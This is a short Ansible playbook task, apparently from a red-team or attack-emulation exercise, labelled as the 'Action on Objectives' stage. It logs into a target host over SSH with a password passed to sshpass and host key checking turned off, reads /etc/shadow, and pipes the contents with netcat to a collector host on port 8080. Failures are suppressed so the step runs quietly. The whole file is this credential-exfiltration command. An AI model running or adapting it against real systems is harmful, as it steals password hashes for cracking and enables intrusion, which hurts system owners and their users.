---
- name: Action on Objectives - Exfiltrate /etc/shadow to collector
  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'cat /etc/shadow' | nc {{ collector_ip }} 8080"
  failed_when: false
